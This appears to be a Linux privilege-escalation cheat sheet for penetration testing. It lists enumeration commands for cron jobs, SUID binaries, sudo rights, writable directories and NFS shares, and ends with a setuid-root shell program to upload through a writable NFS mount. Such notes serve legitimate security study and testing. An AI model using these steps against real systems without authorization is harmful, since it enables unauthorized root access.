### Recon

Change options at the top
```
./LinPeas.sh
```
Check output for last OS updated date.
Kernel version
Check for all users with bash in etc passwd
Look for process running as other user or root


### SUID

```bash
./suid3num.sh
```
https://gtfobins.github.io/

### Cron Jobs

```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
```bash
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
```

#### Sudo privs
```bash
sudo -l
```

#### Kernal

```
linuxexploitsuggester.sh
```

#### Programs Running as root/new user

```bash
ps aux
```

#### User installed software
```
# Common locations for user installed software
/usr/local/
/usr/local/src
/usr/local/bin
/opt/
/home
/var/
/usr/src/

# Debian
dpkg -l

# CentOS, OpenSuse, Fedora, RHEL
rpm -qa (CentOS / openSUSE )

# OpenBSD, FreeBSD
pkg_info
```

#### Plain text password:
```
# Anything interesting the the mail?
/var/spool/mail
```

```
./LinEnum.sh -t -k password
```

#### World writable scripts invoked as root
```
#World writable files directories
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null
find / -perm -o w -type d 2>/dev/null

# World executable folder
find / -perm -o x -type d 2>/dev/null

# World writable and executable folders
find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
```
#### Bad Path configuration
Check for . in path

#### Files systems and NFS Shares

Here we are looking for any unmounted filesystems. If we find one we mount it and start the priv-esc process over again.

```bash
mount -l
cat /etc/fstab
```
If you find that a machine has a NFS share you might be able to use that to escalate privileges. Depending on how it is configured.

```bash
# First check if the target machine has any NFS shares
showmount -e 192.168.1.101

# If it does, then mount it to you filesystem
mount 192.168.1.101:/ /tmp/
```

Check for write permissions on nfs. smbcacls?

If writable compile and upload code as root
```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
int main()
{
    setuid(0);
    system("/bin/bash");
    return 0;
}
```
